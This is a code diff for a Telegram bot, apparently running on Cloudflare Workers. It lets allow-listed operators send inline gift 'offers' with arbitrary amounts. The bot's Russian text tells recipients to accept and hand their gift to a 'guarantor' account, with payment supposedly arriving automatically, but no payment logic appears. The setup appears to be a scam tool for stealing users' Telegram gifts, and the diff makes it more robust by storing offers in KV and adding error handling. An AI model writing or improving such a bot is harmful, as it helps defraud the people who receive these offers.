@@ -24,30 +24,34 @@ export default {
       async function checkAccess(userId, username) {
           if (userId === ADMIN_ID_1 || userId === ADMIN_ID_2) return true; 
           if (!kv) return false; 
-          const byId = await kv.get(`allowed_id:${userId}`);
-          if (byId) return true;
-          if (username) {
-              const byName = await kv.get(`allowed_username:${username.toLowerCase()}`);
-              if (byName) return true;
-          }
+          try {
+              const byId = await kv.get(`allowed_id:${userId}`);
+              if (byId) return true;
+              if (username) {
+                  const byName = await kv.get(`allowed_username:${username.toLowerCase()}`);
+                  if (byName) return true;
+              }
+          } catch (e) { console.error("KV Error:", e.message); }
           return false;
       }
 
       // --- /start ---
       if (update.message && update.message.text === "/start") {
-        const chatId = update.message.chat.id;
-        const userId = update.message.from.id;
-        const username = update.message.from.username;
+        try {
+            const chatId = update.message.chat.id;
+            const userId = update.message.from.id;
+            const username = update.message.from.username;
 
-        if (kv) await kv.put(`user:${userId}`, username || "no_username");
+            if (kv) await kv.put(`user:${userId}`, username || "no_username");
 
-        const startText = `ID: <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Вам приходит оффер на ваш подарок.\n2. Вы нажимаете «Принять».\n3. Передаете подарок гаранту <b>@${RELAYER_USERNAME}</b>.\n4. Оплата приходит автоматически.`;
-        
-        const startMarkup = {
-          inline_keyboard: [[{ text: "Инструкция", callback_data: "how_to_accept" }]]
-        };
+            const startText = `ID: <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Вам приходит оффер на ваш подарок.\n2. Вы нажимаете «Принять».\n3. Передаете подарок гаранту <b>@${RELAYER_USERNAME}</b>.\n4. Оплата приходит автоматически.`;
+            
+            const startMarkup = {
+              inline_keyboard: [[{ text: "Инструкция", callback_data: "how_to_accept" }]]
+            };
 
-        await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
+            await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
+        } catch (e) { console.error("Ошибка /start:", e.message); }
       }
 
       // --- INLINE-ЗАПРОСЫ ---
@@ -102,7 +106,6 @@ export default {
             if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
             const sellerUsername = iq.from.username ? iq.from.username.toLowerCase() : "gwrex";
             
-            // ПОНЯТНЫЙ ТЕКСТ (ИСПРАВЛЕНА ОШИБКА С linkOrGift)
             let text = "";
             let btnAccept = "Принять";
             let btnDecline = "Отклонить";
@@ -125,22 +128,29 @@ export default {
                 titleText = `Оффер: ${amount} ${currencyName}`;
             }
 
+            // СОХРАНЯЕМ ДАННЫЕ В БАЗУ, А В КНОПКУ ПИХАЕМ ТОЛЬКО ID
+            const offerId = Math.random().toString(36).substring(2, 10);
+            if (kv) {
+                await kv.put(`offer:${offerId}`, JSON.stringify({
+                    amount, currencyType, sellerUsername, giftLink, lang, senderName
+                }), { expirationTtl: 86400 });
+            }
+
             const results = [{
               type: "article", id: "1",
               title: titleText,
               description: `${amount} ${currencyName} за ${giftDisplay}`,
               input_message_content: { message_text: text, parse_mode: "HTML" },
               reply_markup: { inline_keyboard: [
-                  [{ text: btnAccept, callback_data: `acc|${amount}|${currencyType}|${sellerUsername}|${giftLink}|${lang}` }],
-                  [{ text: btnDecline, callback_data: `dec|${amount}|${currencyType}|${lang}` }]
+                  [{ text: btnAccept, callback_data: `acc|${offerId}` }],
+                  [{ text: btnDecline, callback_data: `dec|${offerId}` }]
               ] }
             }];
 
             await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 }, BOT_TOKEN);
         } catch (e) { 
             console.error("Ошибка inline_query:", e.message); 
-            // Отправляем пустой ответ, чтобы Telegram не висел
-            await callApi("answerInlineQuery", { inline_query_id: update.inline_query.id, results: [], cache_time: 0 }, BOT_TOKEN);
+            try { await callApi("answerInlineQuery", { inline_query_id: update.inline_query.id, results: [], cache_time: 0 }, BOT_TOKEN); } catch(err){}
         }
       }
 
@@ -149,7 +159,7 @@ export default {
         const cq = update.callback_query;
         const chatId = cq.message.chat.id;
         
-        // МГНОВЕННЫЙ ОТВЕТ
+        // МГНОВЕННЫЙ ОТВЕТ (Убирает бесконечную загрузку)
         try {
             if (cq.data.startsWith("acc")) {
                 await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: "Оффер принят ✅", show_alert: true }, BOT_TOKEN);
@@ -178,18 +188,26 @@ export default {
           } catch (e) {}
         }
 
-        // ОБРАБОТКА КНОПОК
+        // ОБРАБОТКА КНОПОК (ДОСТАЕМ ИЗ БАЗЫ)
         if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
           try {
               const dataParts = cq.data.split("|");
               const action = dataParts[0];
-              const amount = dataParts[1] || "0";
-              const currencyType = dataParts[2] || "stars";
-              const sellerUsername = dataParts[3] || "gwrex"; 
-              const giftLink = dataParts[4] || ""; 
+              const offerId = dataParts[1];
               
-              let lang = "ru";
-              if (action === "acc") { lang = dataParts[5] || "ru"; } else { lang = dataParts[3] || "ru"; }
+              if (!offerId) return new Response("OK", { status: 200 });
+
+              let offer = { amount: "0", currencyType: "stars", sellerUsername: "gwrex", giftLink: "", lang: "ru", senderName: "" };
+              if (kv) {
+                  const saved = await kv.get(`offer:${offerId}`);
+                  if (saved) offer = JSON.parse(saved);
+              }
+
+              const amount = offer.amount;
+              const currencyType = offer.currencyType;
+              const sellerUsername = offer.sellerUsername;
+              const giftLink = offer.giftLink;
+              const lang = offer.lang;
               
               let displayCurrency = "⭐";
               if (currencyType === "gram") displayCurrency = "💎";
@@ -228,12 +246,12 @@ export default {
                   } else {
                     await callApi("editMessageText", { inline_message_id: cq.inline_message_id, text: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
                   }
-                } catch (err) {}
+                } catch (err) { console.error("Edit Error:", err.message); }
               } else if (cq.message) {
                 try {
                   await callApi("sendMessage", { chat_id: chatId, text: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
                   try { await callApi("deleteMessage", { chat_id: chatId, message_id: cq.message.message_id }, BOT_TOKEN); } catch (e) {}
-                } catch (err) {}
+                } catch (err) { console.error("Send Error:", err.message); }
               }
           } catch (e) { console.error("Ошибка обработки кнопки:", e.message); }
         }
